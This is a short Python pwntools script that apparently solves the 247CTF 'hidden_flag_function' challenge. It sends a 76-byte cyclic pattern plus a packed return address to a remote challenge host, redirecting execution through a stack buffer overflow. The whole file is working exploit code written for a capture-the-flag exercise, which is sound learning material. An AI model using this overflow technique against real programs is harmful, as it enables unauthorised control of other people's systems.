from pwn import *

io = remote('ed2757561af4b882.247ctf.com', 50395)
# io = process('./hidden_flag_function')
# io = gdb.debug('./hidden_flag_function', 'b*chall+46')

payload = cyclic(76)
payload += p32(0x08048576)
io.sendline(payload)
io.interactive()